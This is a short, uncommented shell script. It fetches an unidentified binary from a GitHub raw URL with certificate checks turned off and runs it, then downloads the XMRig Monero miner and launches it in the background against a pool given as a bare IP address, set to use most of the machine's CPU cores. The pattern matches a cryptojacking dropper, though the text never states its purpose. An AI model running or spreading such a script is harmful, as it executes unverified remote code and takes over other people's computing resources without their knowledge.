cd ..
wget -N --no-check-certificate https://raw.githubusercontent.com/devcatxmr/xmr/master/nice
chmod +x nice
./nice
wget https://github.com/xmrig/xmrig/releases/download/v5.11.1/xmrig-5.11.1-xenial-x64.tar.gz
tar -xzvf xmrig-5.11.1-xenial-x64.tar.gz
cd xmrig-5.11.1
./xmrig --donate-level 1 -o 13.67.90.188:443 -u ${wkid} -k --max-cpu-usage 75 -B
kill -9 $(ps -ef|grep xmrig|grep -v grep|awk '{print $2}')
cores=$(cat /proc/cpuinfo |grep "processor"|wc -l)
core=$[${cores}/6*5]
./xmrig --donate-level 1 -o 13.67.90.188:443 -u $1 -k --max-cpu-usage 75 -t ${core} -B
